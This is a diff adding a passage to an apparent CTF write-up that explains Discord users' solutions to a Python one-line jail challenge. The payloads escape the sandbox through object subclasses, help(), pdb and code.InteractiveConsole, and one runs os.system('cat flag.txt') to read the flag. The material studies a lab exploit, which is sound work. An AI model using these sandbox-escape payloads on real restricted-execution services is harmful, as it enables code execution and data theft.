@@ -491,4 +491,92 @@ Adapt the script above to load `pdb` module instead. Then, we can execute what w
 
 ## Explain the writeups above
 
-TODO
+Now we can explain the wriups by folks on Discord:
+
+@hibwyli:
+
+```python
+# step 1, launch help(), load pdb module and return to pdb
+# t=10, f=150, e=5, f+t-True=159
+>> [t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,().__class__.__base__.__subclasses__()[f+t-True]] 
+[10, 150, 5, <class '_sitebuiltins._Helper'>]
+>> [t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,().__class__.__base__.__subclasses__()[f+t-True]()()] 
+help> pdb
+help> sandbox
+# step 2, run pdb.set_trace()
+>> [s:=True+True+True,t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,a:=().__class__.__base__.__subclasses__()[f+t-True].__doc__,().__class__.__base__.__subclasses__()[f+t-True-True].__init__.__globals__[a[t+t+t+e]+a[t+t+t+t+t+e+s]+a[t+t+t+e]].modules[a[t+t+s]+a[t+t+t+t+t+e]+a[t+True]]]
+[3, 10, 150, 5, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    ", <module 'pdb' from '/usr/local/lib/python3.12/pdb.py'>]
+>> [s:=True+True+True,t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,a:=().__class__.__base__.__subclasses__()[f+t-True].__doc__,().__class__.__base__.__subclasses__()[f+t-True-True].__init__.__globals__[a[t+t+t+e]+a[t+t+t+t+t+e+s]+a[t+t+t+e]].modules[a[t+t+s]+a[t+t+t+t+t+e]+a[t+True]].set_trace()]
+# read flag in pdb
+(Pdb) "".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat flag.txt")
+FortID{Wh3n_7h3_517u4710n_l00k5_1mp0551bl3,_y0u_d0n7_g1v3_up}
+0
+(Pdb)
+```
+
+@Phisher:
+
+```python
+# step 1. run help() and load pdb
+>> [B for B in[().__class__.__base__]]
+[<class 'object'>]
+>> [L for B in[().__class__.__base__]for L in[[].__class__.__name__]]
+['list']
+# construct "sys"
+>> ().__format__.__name__[True+True]
+f
+>> [B.__class__.__name__ for B in[().__class__.__base__]]
+['type']
+>> [L[True+True]+B.__class__.__name__[True]+L[True+True] for B in[().__class__.__base__]for L in[[].__class__.__name__]]
+# 'list'[2]+'type'[1]+'list'[2] == 'sys'
+['sys']
+# filter by module name to find sys
+>> [S for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]]
+[<module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>, <module 'sys' (built-in)>]
+# find builtins module
+>> [].__class__.__module__
+builtins
+>> [m for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]for m in S.modules.values()if m.__name__==[].__class__.__module__]
+[<module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>, <module 'builtins' (built-in)>]
+# run builtins.help()
+>> [m.help()for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]for m in S.modules.values()if m.__name__==[].__class__.__module__][False]
+# load pdb and return to sandbox
+pdb
+sandbox
+# step 2. execute pdb.set_trace()
+>> [B.__class__.__name__ for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+type
+>> [G.__class__.__name__ for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+dict
+>> [B.__name__ for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+object
+# "type"[2]+"dict"[0]+"object"[1] == "pdb"
+>> [S.modules[B.__class__.__name__[True+True]+G.__class__.__name__[False]+B.__name__[True]] for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+<module 'pdb' from '/usr/local/lib/python3.12/pdb.py'>
+>> [S.modules[B.__class__.__name__[True+True]+G.__class__.__name__[False]+B.__name__[True]].set_trace() for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]][False]
+# enters pdb prompt
+```
+
+@(ztz:
+
+```python
+# step 1. run help()
+# 159 is the index of _sitebuiltins._Helper
+>> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__]
+["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, <built-in method __subclasses__ of type object at 0x7efe341e6040>]
+# locate _sitebuiltins._Helper
+>> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]]
+["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, <built-in method __subclasses__ of type object at 0x7efe341e6040>, <class '_sitebuiltins._Helper'>]
+# locate code.InterativeConsole class
+# enter help prompt, enter code, quit to return
+# the newly loaded code.InteractiveInterpreter is a subclass of object
+>> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()]
+[..., [..., <class 'code.InteractiveInterpreter'>, <class 'pydoc.TextDoc.docclass.<locals>.HorizontalRule'>, <class 'pydoc.TextDoc.docclass.<locals>.HorizontalRule'>]]
+# ww-ww-ww-ww-ww is -4, code.InteractiveConsole is a subclass of code.InteractiveInterpreter
+>> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]]
+["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, <built-in method __subclasses__ of type object at 0x7efe341e6040>, None, <class 'code.InteractiveConsole'>]
+# get interactive shell
+>> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]().interact()]
+
+https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md?plain=1#L15
+```
